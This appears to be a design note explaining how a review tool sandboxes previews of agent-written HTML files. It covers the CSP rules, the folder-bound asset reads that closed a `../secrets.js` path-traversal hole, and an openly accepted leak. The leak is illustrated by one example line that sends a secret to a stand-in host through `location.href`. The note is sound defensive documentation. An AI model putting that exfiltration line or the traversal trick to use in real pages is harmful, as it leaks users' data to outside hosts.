# Previewing an HTML file an agent wrote

Status: implemented. Scripts run, and the preview does **not** meet a no-exfiltration promise: the
frame can send what it sees into a URL it navigates to. That channel is known and accepted.

A previewed `.html` file is rendered from `srcdoc` in an iframe with
`sandbox="allow-scripts"` and no `allow-same-origin`, so the document has an opaque origin: it
cannot read Porcelain's storage, cookies or DOM, and it is not the review API's origin. Every local
asset it names is carried inside it as a `data:` URL, and a Content-Security-Policy is prepended
with `default-src 'none'`, `connect-src 'none'`, `form-action 'none'` and `base-uri 'none'`. A
supplied `<base>` or `http-equiv` metadata is removed first, so a document cannot re-point its own
references or replace that policy.

So a previewed file cannot load a subresource from the network, call `fetch` or `XMLHttpRequest`,
submit a form, read Porcelain's storage, cookies, API or DOM, or navigate the page around it. There
is no capability to steal, no origin to confuse and nothing about a preview in the request log.

It can still navigate **itself**, and that is an exfiltration channel. See below: the preview does
not meet a no-exfiltration promise, and nothing in this design claims it does.

## What is bounded, and by what

References are resolved against the **document's own folder**, and anything that leaves it is
refused. This is the half that matters: the browser resolves `../secrets.js` before anyone else
sees it, so a reference that climbed out of the folder used to reach the server as the ordinary
path `secrets.js` and be read. Any file with an allow-listed extension, anywhere in the worktree,
was readable by hostile preview HTML. The bound is applied twice — in the rewriter, which can tell
the reader what it refused, and again in
[the batch read](../../apps/server/src/use-cases/read-preview-assets.ts), which is the one that has
to hold.

A document that sits at the worktree root has the worktree as its folder. That is the bound
working as defined rather than an exception, and it is worth knowing: a hostile HTML file saved at
the root can still name any allow-listed file in the repository. Narrowing that further would mean
serving only what the document references, which needs the server to parse the HTML.

Assets are read in one request per round of discovery — everything the document names, then
everything its stylesheets named, and so on, to a depth of eight — sharing one budget of 64 files
and 28 MiB expanded. Each file keeps the checks the single-asset route has: the extension
allow-list, per-path validation, a 10 MiB cap, a read that does not follow a final symlink, and the
worktree confirmed again afterwards.

## The leak we accept

`sandbox="allow-scripts"` lets the frame **navigate itself**, and no CSP directive in this set
stops it: `connect-src` governs fetch and XHR, `form-action` governs form submission, and the
directive that once governed navigation was removed from the specification. A script in a previewed
file can therefore put anything it can see into a URL and send the frame there —
`location.href = 'https://elsewhere.invalid/?' + secret` — and the request goes out.
`Referrer-Policy: no-referrer` removes the referrer, not the address.

So the preview cannot both run arbitrary scripts and promise that nothing leaves. The owner chose
to keep scripts, because an agent's report is worth reading with its charts working. What the
sandbox does still buy is real and is the reason it stays: the page cannot read Porcelain's session,
cannot call the review API, cannot read the worktree beyond the document's folder, and cannot
navigate the surrounding page.

This is written in the interface as well as here: the banner above a preview says a script can send
what it sees by sending the frame elsewhere. The alternative — dropping `allow-scripts` and
stripping links — is a static preview, and is the thing to build if a preview ever has to be safe
to open without trusting what wrote it.
